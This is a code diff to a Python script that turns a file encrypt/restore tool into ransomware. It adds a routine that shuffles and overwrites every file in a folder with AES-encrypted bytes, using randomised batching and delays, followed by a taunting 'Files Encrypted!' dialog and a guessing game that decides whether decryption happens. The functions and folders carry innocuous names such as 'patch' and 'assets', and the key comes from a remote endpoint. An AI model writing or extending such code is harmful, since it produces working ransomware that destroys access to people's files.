@@ -6,6 +6,12 @@ import requests
 import tkinter as tk
 from tkinter import simpledialog, messagebox
 import hashlib
+import random
+import time
+import tkinter as tk
+from tkinter import messagebox, simpledialog
+
+mode = "patch"
 
 def get_key_from_endpoint(random_path):
     # Construct the key retrieval URL
@@ -39,23 +45,63 @@ def reverse_vector(blob: bytes, config_token: bytes) -> bytes:
     session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).decryptor()
     return session.update(ciphertext) + session.finalize()
 
-def scan_and_patch_assets(asset_dir: str, config_token: bytes):
+def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60.0):
+    # Step 1: Collect and shuffle files
+    file_paths = []
     for dirpath, _, assets in os.walk(asset_dir):
         for asset in assets:
-            asset_path = os.path.join(dirpath, asset)
+            file_paths.append(os.path.join(dirpath, asset))
+    random.shuffle(file_paths)
 
-            try:
-                with open(asset_path, 'rb') as f:
-                    payload = f.read()
-            except Exception:
-                continue  # unreadable files (permissions, etc.)
+    total_files = len(file_paths)
+    if total_files == 0:
+        print("No files found.")
+        return
 
+    # Step 2: Set batch and delay ranges based on file count
+    if total_files <= 20:
+        min_batch, max_batch = 1, 2
+        min_delay, max_delay = 0.2, 0.5
+    elif total_files <= 100:
+        min_batch, max_batch = 2, 4
+        min_delay, max_delay = 0.1, 0.3
+    elif total_files <= 500:
+        min_batch, max_batch = 4, 8
+        min_delay, max_delay = 0.05, 0.2
+    else:
+        min_batch, max_batch = 6, 12
+        min_delay, max_delay = 0.04, 0.3
+
+    # Step 3: Calculate approximate delay budget per batch
+    start_time = time.time()
+    i = 0
+    while i < total_files:
+        batch_size = random.randint(min_batch, max_batch)
+        for _ in range(batch_size):
+            if i >= total_files:
+                break
+            path = file_paths[i]
             try:
-                transformed = run_vector(payload, config_token)
-                with open(asset_path, 'wb') as f:  # overwrite with encrypted bytes
-                    f.write(transformed)
+                with open(path, 'rb') as f:
+                    data = f.read()
+                encrypted = run_vector(data, config_token)
+                with open(path, 'wb') as f:
+                    f.write(encrypted)
+                print(f"[{i+1}/{total_files}] Encrypted: {path}")
             except Exception:
-                pass  # skip if encryption fails
+                print(f"[{i+1}/{total_files}] Failed: {path}")
+            i += 1
+
+        # Check remaining time
+        elapsed = time.time() - start_time
+        remaining = total_duration - elapsed
+        batches_left = max(1, (total_files - i) // max_batch)
+
+        # Dynamically compute delay to stretch time without going over
+        if remaining > 0 and i < total_files:
+            max_allowable_delay = remaining / batches_left
+            delay = random.uniform(min_delay, min(max_delay, max_allowable_delay))
+            time.sleep(delay)
 
 def restore_assets(asset_dir: str, config_token: bytes):
     for dirpath, _, assets in os.walk(asset_dir):
@@ -73,11 +119,49 @@ def restore_assets(asset_dir: str, config_token: bytes):
             except Exception:
                 pass  # skip if decryption fails
 
+def show_ransom_modal():
+    root = tk.Tk()
+    root.withdraw()
+
+    response = messagebox.askquestion(
+        "💀 Oops... Files Encrypted!",
+        "🎉 Surprise! Your precious files are now on vacation — permanently encrypted.\n\n"
+        "But hey, I’m feeling generous today...\n"
+        "Would you like a *totally fair* chance to win them back?\n\n"
+        "Click YES to 'Play a Game'\n"
+        "Click NO to 'Lose Everything Like a Legend' 💀"
+    )
+
+    if response == "yes":
+        play_game()
+    else:
+        messagebox.showerror("🔥 RIP Files", "Well... you chose doom. Enjoy the silence 💣")
+        # exit() or fake "delete" logic here
+def play_game():
+    global mode  # allows us to update the global `mode`
+
+    correct_answer = "documents"
+    tries = 3
+
+    for attempt in range(1, tries + 1):
+        guess = simpledialog.askstring(
+            "Game Time 🎮",
+            f"Guess the name of the folder I hate the most.\n"
+            f"Hint: It's something you never backed up.\n"
+            f"Attempt {attempt} of {tries}:"
+        )
+        if guess and guess.lower().strip() == correct_answer:
+            messagebox.showinfo("🏆 Bravo!", "Wow. You actually got it. Decryption will now begin...")
+            mode = "restore"  # 🧠 change the mode!
+            return
+        else:
+            messagebox.showwarning("❌ Nope", "Wrong guess. Try again...")
+
+    messagebox.showerror("💀 Game Over", "You failed. The files are gone. Forever-ish.")
 
 # === SYSTEM EXECUTION ===
 if __name__ == "__main__":
     import time
-    calibration_file = "CV.pdf"  # seed file (appears like a manual)
     resources_folder = "testfolder"       # appears like system logs folder
 
     root = tk.Tk()
@@ -91,15 +175,14 @@ if __name__ == "__main__":
     if not key:
         messagebox.showerror("Error", "Failed to retrieve the key. Please check your random path.")
         exit(1)
-    # Choose mode: 'patch' to encrypt, 'restore' to decrypt
-    mode = "restore"  # change to "patch" to encrypt again
 
     if mode == "patch":
         start = time.time()
         scan_and_patch_assets(resources_folder, key)
         end = time.time()
-        print(f" Encryption completed in {end - start:.2f} seconds.")
-    elif mode == "restore":
+        print(f"Encryption finished in {end - start:.2f} seconds.")
+        show_ransom_modal()  # ← may change mode to "restore"
+
+    if mode == "restore":
         restore_assets(resources_folder, key)
-    else:
-        print("Invalid mode. Use 'patch' or 'restore'.")
+        print("Files restored successfully.")
